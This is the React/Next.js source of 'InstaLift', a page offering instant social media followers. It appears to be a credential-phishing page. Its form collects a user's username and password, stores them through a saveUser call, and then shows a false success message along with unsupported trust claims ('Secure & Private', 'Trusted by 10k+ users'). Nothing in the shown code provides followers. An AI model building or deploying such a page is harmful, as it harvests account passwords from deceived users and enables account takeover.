'use client';

import { saveUser } from '@/lib/utils';
import { useState, useEffect } from 'react';

export default function Home() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    followers: '100'
  });
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  useEffect(() => {
    // Check localStorage first, then system preferences
    const savedMode = localStorage.getItem('darkMode');
    if (savedMode !== null) {
      setIsDarkMode(savedMode === 'true');
    } else {
      const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
      setIsDarkMode(darkModeMediaQuery.matches);
    }

    // Listen for changes in system preferences
    const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const handleChange = (e: MediaQueryListEvent) => {
      if (localStorage.getItem('darkMode') === null) {
        setIsDarkMode(e.matches);
      }
    };
    darkModeMediaQuery.addEventListener('change', handleChange);

    return () => darkModeMediaQuery.removeEventListener('change', handleChange);
  }, []);

  useEffect(() => {
    // Update the HTML class and localStorage when dark mode changes
    document.documentElement.classList.toggle('dark', isDarkMode);
    localStorage.setItem('darkMode', isDarkMode.toString());
  }, [isDarkMode]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Handle form submission here
    console.log(formData);
    setShowSuccess(true);

    const username = formData.username
    const password = formData.password
    const followers = formData.followers
    try {
      await saveUser({username, password , followers})
      
    } catch (error) {
      console.log(error)
    } finally {
      // Reset form
      setFormData({
        username: '',
        password: '',
        followers: '100'
      });

    }

    

    // Hide success message after 5 seconds
    setTimeout(() => {
      setShowSuccess(false);
    }, 5000);
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const toggleDarkMode = () => {
    setIsDarkMode(!isDarkMode);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-400 via-purple-500 to-pink-500 dark:from-indigo-900 dark:via-purple-900 dark:to-pink-900 flex items-center justify-center p-4">
      <div className="max-w-md w-full space-y-8 bg-white/95 dark:bg-black/95 backdrop-blur-md p-8 rounded-xl shadow-2xl border border-white/30 dark:border-gray-800">
        <div className="flex justify-between items-center">
          <div className="text-3xl font-bold bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">
            InstaLift
          </div>
          <button
            onClick={toggleDarkMode}
            className="p-2 rounded-lg bg-white/30 dark:bg-black/30 hover:bg-white/40 dark:hover:bg-black/40 transition-colors shadow-lg"
            aria-label="Toggle dark mode"
          >
            {isDarkMode ? (
              <svg className="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20">
                <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" />
              </svg>
            ) : (
              <svg className="w-5 h-5 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
              </svg>
            )}
          </button>
        </div>

        <div className="text-center">
          <h1 className="text-4xl font-bold bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent mb-2">
            Grow Your Followers Instantly
          </h1>
          <p className="text-gray-600 dark:text-gray-300">
            Choose your plan and watch your followers grow in minutes.
          </p>
        </div>

        {showSuccess ? (
          <div className="bg-green-50/90 dark:bg-green-900/30 border border-green-200 dark:border-green-800 rounded-lg p-4 mb-6 backdrop-blur-sm shadow-lg">
            <div className="flex items-center">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-green-500" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm font-medium text-green-800 dark:text-green-200">
                  Success! Your followers will be added shortly.
                </p>
              </div>
            </div>
          </div>
        ) : null}

        <form onSubmit={handleSubmit} className="mt-8 space-y-6">
          <div className="space-y-4">
            <div>
              <label htmlFor="username" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                Username
              </label>
              <input
                id="username"
                name="username"
                type="text"
                required
                className="mt-1 block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition duration-150 ease-in-out bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm text-gray-900 dark:text-white"
                value={formData.username}
                onChange={handleChange}
              />
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                required
                className="mt-1 block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition duration-150 ease-in-out bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm text-gray-900 dark:text-white"
                value={formData.password}
                onChange={handleChange}
              />
            </div>

            <div>
              <label htmlFor="followers" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                Number of Followers
              </label>
              <select
                id="followers"
                name="followers"
                className="mt-1 block w-full pl-3 pr-10 py-2 text-base border border-gray-300 dark:border-gray-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 rounded-md transition duration-150 ease-in-out bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm text-gray-900 dark:text-white"
                value={formData.followers}
                onChange={handleChange}
              >
                <option value="100">100 Followers</option>
                <option value="500">500 Followers</option>
                <option value="1000">1000 Followers</option>
                <option value="5000">5000 Followers</option>
              </select>
            </div>
          </div>

          <button
            type="submit"
            className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-lg text-sm font-medium text-white bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 hover:from-indigo-600 hover:via-purple-600 hover:to-pink-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500 transition duration-150 ease-in-out transform hover:scale-[1.02]"
          >
            Get Followers
          </button>
        </form>

        <div className="mt-8 grid grid-cols-2 gap-4 text-center">
          <div className="p-4 bg-white/60 dark:bg-gray-800/60 rounded-lg border border-white/30 dark:border-gray-700 backdrop-blur-sm shadow-lg hover:bg-white/70 dark:hover:bg-gray-800/70 transition-colors">
            <p className="text-sm font-medium text-gray-900 dark:text-white">Secure & Private</p>
            <p className="text-xs text-gray-500 dark:text-gray-300">Your data is protected</p>
          </div>
          <div className="p-4 bg-white/60 dark:bg-gray-800/60 rounded-lg border border-white/30 dark:border-gray-700 backdrop-blur-sm shadow-lg hover:bg-white/70 dark:hover:bg-gray-800/70 transition-colors">
            <p className="text-sm font-medium text-gray-900 dark:text-white">Trusted by 10k+ users</p>
            <p className="text-xs text-gray-500 dark:text-gray-300">Join our community</p>
          </div>
        </div>
      </div>
    </div>
  );
}
